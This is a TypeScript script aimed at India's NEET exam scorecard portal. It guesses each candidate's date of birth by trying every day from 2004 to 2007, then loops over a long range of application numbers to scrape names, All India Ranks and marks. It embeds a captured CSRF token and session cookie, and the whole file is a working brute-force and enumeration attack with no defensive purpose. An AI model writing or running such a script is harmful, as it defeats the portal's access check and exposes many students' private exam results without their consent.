import axios from 'axios';
import qs from 'qs';
import cheerio from 'cheerio';
import { data } from 'cheerio/lib/api/attributes';


async function solve ( applicationNumber : string , day  : string , month : string , year : string ){
    let data = qs.stringify({
        '_csrf-frontend': 'H4feNVIiOszkxfGoSGdDeQwz22LiOtSXeA2Z1ZfFMtVz5LUBO1dvn7OrkMwPJgYhbmCrJr0Kn6ZMSOil4fFLpQ==',
        'Scorecardmodel[ApplicationNumber]': applicationNumber,
        'Scorecardmodel[Day]': day,
        'Scorecardmodel[Month]': month,
        'Scorecardmodel[Year]': year 
      });
      
      let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'https://neet.ntaonline.in/frontend/web/scorecard/index',
        headers: { 
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 
          'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 
          'Cache-Control': 'max-age=0', 
          'Connection': 'keep-alive', 
          'Content-Type': 'application/x-www-form-urlencoded', 
          'Cookie': 'advanced-frontend=8i53aqs001cmofma6lmqphibuo; _csrf-frontend=65d0135bd39c1b5a1a6110013563ac1c79cf7222cd64949038c404670fb8b8fba%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22lck4iuUSWnadGAEXbSpD_0K14Eqpv4yp%22%3B%7D', 
          'Origin': 'null', 
          'Sec-Fetch-Dest': 'document', 
          'Sec-Fetch-Mode': 'navigate', 
          'Sec-Fetch-Site': 'same-origin', 
          'Sec-Fetch-User': '?1', 
          'Upgrade-Insecure-Requests': '1', 
          'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 
          'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"', 
          'sec-ch-ua-mobile': '?0', 
          'sec-ch-ua-platform': '"macOS"'
        },
        data : data
      };
      
      const response = await axios. request (config)
      const parsedData = parseHtml(JSON.stringify(response.data));
     return parsedData;
}
function parseHtml(htmlContent : string) {
    const $ = cheerio.load(htmlContent);
    const applicationNumber = $('td:contains("Application No.")') .next('td'). text().trim() || 'N/A';
    const candidateName = $('td:contains("Candidate’s Name")').next(). text().trim() || 'N/A';
    const allIndiaRank = $('td:contains("NEET All India Rank")') .next('td').text().trim() || 'N/A';
    const marks = $('td:contains("Total Marks Obtained (out of 720)")'). first().next('td'). text(). trim() || 'N/A';
    
   
    if (allIndiaRank ===
        'N/A') {
        return null;
        }
        return {applicationNumber, candidateName, allIndiaRank, marks}
    }

    async function main(rollNumber: string) {
        let solved =false ;
        for (let year = 2007; year >= 2004; year--) {
            if(solved){
                break
;            }
            for (let month = 1; month <= 12; month++) {
                if(solved){
                    break;
                }
                const dataPromises = []; 
                console.log("sending request for the month" + month + "of the year" + year)
                for (let day = 1; day <= 31; day++) {
                   
                    const dataPromise = solve(rollNumber, day.toString(), month.toString(), year.toString());
                    dataPromises.push(dataPromise);
                }
               const resolvedata=  await Promise.all(dataPromises);
               resolvedata.forEach(data => {
                if(data){
                    console.log(data);
                    solved =true;
                }
               })
            }
        }
    }
async function solveallapp(){
    for( let i =240411345673 ; i<240411999999 ; i++){
        await main(i.toString());
    }
}
solveallapp();

 